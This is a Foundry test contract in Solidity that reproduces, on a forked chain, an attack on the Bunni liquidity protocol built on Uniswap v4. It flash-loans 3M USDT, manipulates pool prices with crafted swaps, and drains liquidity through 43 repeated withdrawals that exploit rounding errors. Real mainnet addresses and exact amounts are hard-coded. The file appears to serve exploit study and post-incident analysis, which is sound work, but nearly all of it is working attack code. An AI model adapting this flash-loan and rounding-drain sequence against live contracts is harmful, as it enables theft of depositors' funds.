// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

import {IUniswapV3Pool, IUniswapV3FlashCallback, IBunniHub} from "./Interfaces.sol";
import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";


contract Exploit_Bunni is IUniswapV3FlashCallback, Test, TokenBalanceTracker {
    using SafeERC20 for IERC20;

    bytes32 constant EXPLOIT_TX =
        0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b;

    address private constant attacker =
        0x657D8BcCDD9C6e1Da8DA1e7d331CFdeA8357AdBc;

    IERC20 private constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant USDT =
        IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    Currency private constant USDC_C = Currency.wrap(address(USDC));
    Currency private constant USDT_C = Currency.wrap(address(USDT));

    IUniswapV3Pool private constant pairWethUsdt =
        IUniswapV3Pool(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);
    IERC20 private constant pairUsdcUsdt =
        IERC20(0xc92c2ba90213Fc3048A527052B0b4FeBFA716763); // Bunni LP

    uint256 private constant FLASH_LOAN_AMOUNT = 3e12; // 3M USDT

    IPoolManager constant POOL_MANAGER =
        IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IBunniHub constant BUNNI_HUB =
        IBunniHub(0x000000000049C7bcBCa294E63567b4D21EB765f1);
    IHooks private constant BUNNI_HOOK =
        IHooks(0x000052423c1dB6B7ff8641b85A7eEfc7B2791888);

    PoolKey poolKey;
    PoolId poolId;

    enum UnlockCallbackType {
        SWAP
    }

    struct SwapCallbackInputData {
        PoolKey poolKey;
        IPoolManager.SwapParams[] params;
        int256[][] expectedDeltas;
        bytes hookData;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), EXPLOIT_TX);

        // Configure the Uniswap v4 pool key for the USDC/USDT pair
        poolKey = PoolKey({
            currency0: USDC_C,
            currency1: USDT_C,
            fee: 0,
            tickSpacing: 1,
            hooks: BUNNI_HOOK
        });

        // This poolId is used to reference this specific pool in the Pool Manager
        poolId = poolKey.toId();
        deal(address(this), 0);
        addTokenToTracker(address(USDC));
        addTokenToTracker(address(USDT));
        addTokenToTracker(address(pairUsdcUsdt));
        updateBalanceTracker(address(this));
    }

    function test_attack() public {
        console.log("------- INITIAL BALANCES -------");
        logBalancesWithLabel("Attacker", address(this));

        console.log(
            "------- STEP 1: Transfer LP tokens to exploit contract -------"
        );
        // Transfer Bunni USDC/USDT LP tokens from attacker to this contract
        // These LP tokens represent liquidity positions in the Bunni pool
        uint256 exploiterBalanceLp = pairUsdcUsdt.balanceOf(attacker);

        vm.prank(attacker);
        pairUsdcUsdt.safeTransfer(address(this), exploiterBalanceLp);
        vm.stopPrank();

        logBalancesWithLabel("Attacker", address(this));

        console.log(
            "------- STEP 2: Initiate flash loan from Uniswap V3 -------"
        );
        // Flash loan 3M USDT from WETH/USDT pool to fund the attack
        pairWethUsdt.flash(address(this), 0, FLASH_LOAN_AMOUNT, "");
    }

    function uniswapV3FlashCallback(
        uint256 /* fee0 */,
        uint256 fee,
        bytes calldata /* data */
    ) external override {
        logBalancesWithLabel("Exploit contract ", address(this));

        // Execute multi-stage exploitation sequence
        executeInitialSwapSequence(); // Step 3: Manipulate pool price
        executeWithdrawalSequence(); // Step 4: Drain liquidity via rounding errors
        executeFinalSwapSequence(); // Step 5: Extract profit and restore pool state

        console.log("------- STEP 6: Repay flash loan -------\n");
        USDT.safeTransfer(address(pairWethUsdt), FLASH_LOAN_AMOUNT + fee);

        console.log("------- FINAL BALANCES -------");
        logBalancesWithLabel("Attacker", address(this));
    }

    // Execute initial swap sequence to manipulate pool price and reserves
    function executeInitialSwapSequence() internal {
        console.log("------- STEP 3: Execute initial swap sequence -------");
        IPoolManager.SwapParams[]
            memory swapParams = new IPoolManager.SwapParams[](3);
        int256[][] memory expectedDeltas = new int256[][](3);

        // Swap 1: Small USDT->USDC swap to test pool state
        swapParams[0] = IPoolManager.SwapParams({
            zeroForOne: false,
            amountSpecified: -17_088106,
            sqrtPriceLimitX96: 79226236828369693485340663719
        });

        expectedDeltas[0] = new int256[](2);
        expectedDeltas[0][0] = 2;
        expectedDeltas[0][1] = swapParams[0].amountSpecified;

        // Swap 2: Large USDC->USDT swap to drain pool reserves
        swapParams[1] = IPoolManager.SwapParams({
            zeroForOne: false,
            amountSpecified: 1_835_309_634512,
            sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
        });

        expectedDeltas[1] = new int256[](2);
        expectedDeltas[1][0] = swapParams[1].amountSpecified; // Pays 1.8M USDC
        expectedDeltas[1][1] = -1_835_492_291952; //  Receives 1.8M USDT

        // Swap 3: Small USDT->USDC swap to finalize manipulation
        swapParams[2] = IPoolManager.SwapParams({
            zeroForOne: false,
            amountSpecified: -1_000000,
            sqrtPriceLimitX96: 101729702841318637793976746270
        });

        expectedDeltas[2] = new int256[](2);
        expectedDeltas[2][0] = 472;
        expectedDeltas[2][1] = swapParams[2].amountSpecified;

        console.log("Executing 3 swaps to manipulate pool reserves");
        // Execute all three swaps through PoolManager.unlock()
        // This triggers the unlockCallback which handles token settlements
        POOL_MANAGER.unlock(
            abi.encode(
                UnlockCallbackType.SWAP,
                abi.encode(
                    SwapCallbackInputData({
                        poolKey: poolKey,
                        params: swapParams,
                        expectedDeltas: expectedDeltas,
                        hookData: ""
                    })
                )
            )
        );
        console.log("Initial swap sequence completed\n");
        logBalancesWithLabel("After initial swaps", address(this));
    }

    // Uniswap V4 callback triggered by PoolManager.unlock()
    // The unlock mechanism allows  multi-step operations where token deltas
    // are accumulated and settled at the end, rather than immediately
    function unlockCallback(
        bytes calldata data
    ) external returns (bytes memory) {
        console.log("Unlock callback triggered");
        // Track cumulative token deltas across all operations
        int128 cumulativeUsdcDelta;
        int128 cumulativeUsdtDelta;
        // Decode callback type and extract swap parameters
        (, bytes memory callbackData) = abi.decode(
            data,
            (UnlockCallbackType, bytes)
        );
        SwapCallbackInputData memory swapData = abi.decode(
            callbackData,
            (SwapCallbackInputData)
        );
        // Execute each swap and accumulate the resulting token deltas
        for (uint256 i; i < swapData.params.length; i++) {
            // Execute the swap through PoolManager
            // The swap modifies pool reserves and returns the token deltas
            BalanceDelta swapDelta = POOL_MANAGER.swap(
                swapData.poolKey,
                swapData.params[i],
                swapData.hookData
            );
            // Extract USDC and USDT deltas from the swap result
            (int128 usdcDelta, int128 usdtDelta) = (
                swapDelta.amount0(),
                swapDelta.amount1()
            );
            // Accumulate deltas for final settlement
            cumulativeUsdcDelta += usdcDelta;
            cumulativeUsdtDelta += usdtDelta;
        }
        // Settle all accumulated token deltas with the PoolManager
        reconcilePoolManagerBalances(cumulativeUsdcDelta, cumulativeUsdtDelta);
    }

    // Reconcile token balances with the PoolManager after swap execution
    // The PoolManager tracks deltas during swaps and requires settlement before unlock completes
    function reconcilePoolManagerBalances(
        int128 cumulativeUsdcDelta,
        int128 cumulativeUsdtDelta
    ) internal {
        console.log("Settling token deltas with PoolManager");
        // settle USDC deltas
        if (cumulativeUsdcDelta > 0) {
            uint256 usdcAmount = uint256(uint128(cumulativeUsdcDelta));
            POOL_MANAGER.take(USDC_C, address(this), usdcAmount);
            console.log("Taking USDC from PoolManager:", usdcAmount);
        } else if (cumulativeUsdcDelta < 0) {
            uint256 usdcAmount = uint256(uint128(-cumulativeUsdcDelta));
            POOL_MANAGER.sync(USDC_C);
            USDC.safeTransfer(address(POOL_MANAGER), usdcAmount);
            POOL_MANAGER.settle();
            console.log("Settling USDC to PoolManager:", usdcAmount);
        }

        // settle USDT deltas
        if (cumulativeUsdtDelta > 0) {
            uint256 usdtAmount = uint256(uint128(cumulativeUsdtDelta));
            POOL_MANAGER.take(USDT_C, address(this), usdtAmount);
            console.log("Taking USDT from PoolManager:", usdtAmount);
        } else if (cumulativeUsdtDelta < 0) {
            uint256 usdtAmount = uint256(uint128(-cumulativeUsdtDelta));
            POOL_MANAGER.sync(USDT_C);
            USDT.safeTransfer(address(POOL_MANAGER), usdtAmount);
            POOL_MANAGER.settle();
            console.log("Settling USDT to PoolManager:", usdtAmount);
        }
        console.log("Token deltas settled successfully\n");
    }

    // Execute repeated withdrawals to drain liquidity from the manipulated pool
    function executeWithdrawalSequence() internal {
        console.log("------- STEP 4: Execute withdrawal sequence -------");
        // Track total tokens withdrawn across all iterations
        uint256 totalUsdcWithdrawn;
        uint256 totalUsdtWithdrawn;
        // Prepare withdrawal parameters for two different withdrawal amounts
        IBunniHub.WithdrawParams[]
            memory withdrawParams = new IBunniHub.WithdrawParams[](2);
        uint256[][] memory expectedAmounts = new uint256[][](2);
        // First withdrawal
        withdrawParams[0] = IBunniHub.WithdrawParams({
            poolKey: poolKey,
            recipient: address(this),
            shares: 119254548996,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            useQueuedWithdrawal: false
        });

        // Second withdrawal
        withdrawParams[1] = IBunniHub.WithdrawParams({
            poolKey: poolKey,
            recipient: address(this),
            shares: 331262636100,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            useQueuedWithdrawal: false
        });

        // Execute first withdrawal
        (uint256 amount0, uint256 amount1) = BUNNI_HUB.withdraw(
            withdrawParams[0]
        );
        totalUsdcWithdrawn += amount0;
        totalUsdtWithdrawn += amount1;
        // Execute 43 iterations of the larger withdrawal
        for (uint256 i; i < 43; i++) {
            (amount0, amount1) = BUNNI_HUB.withdraw(withdrawParams[1]);
            totalUsdcWithdrawn += amount0;
            totalUsdtWithdrawn += amount1;
        }

        logBalancesWithLabel("After withdrawals", address(this));
    }

    // Execute final swap sequence to extract profit
    function executeFinalSwapSequence() internal {
        console.log("------- STEP 5: Execute final swap sequence -------");
        IPoolManager.SwapParams[]
            memory swapParams = new IPoolManager.SwapParams[](2);
        int256[][] memory expectedDeltas = new int256[][](2);

        // Swap 4: Extreme USDT->USDC swap to maximize manipulation
        swapParams[0] = IPoolManager.SwapParams({
            zeroForOne: false,
            amountSpecified: -10_000_000_000_000_000000,
            sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
        });

        expectedDeltas[0] = new int256[](2);
        expectedDeltas[0][0] = 1;
        expectedDeltas[0][1] = swapParams[0].amountSpecified;

        // Swap 5: Reverse USDC->USDT to extract profit
        swapParams[1] = IPoolManager.SwapParams({
            zeroForOne: true,
            amountSpecified: 10_000_002_885_864_344623,
            sqrtPriceLimitX96: 4295128740
        });

        expectedDeltas[1] = new int256[](2);
        expectedDeltas[1][0] = -503_177_409646;
        expectedDeltas[1][1] = swapParams[1].amountSpecified;

        // Execute both swaps
        POOL_MANAGER.unlock(
            abi.encode(
                UnlockCallbackType.SWAP,
                abi.encode(
                    SwapCallbackInputData({
                        poolKey: poolKey,
                        params: swapParams,
                        expectedDeltas: expectedDeltas,
                        hookData: ""
                    })
                )
            )
        );
        console.log("Final swap sequence completed\n");
        logBalancesWithLabel("After final swaps", address(this));
    }
}
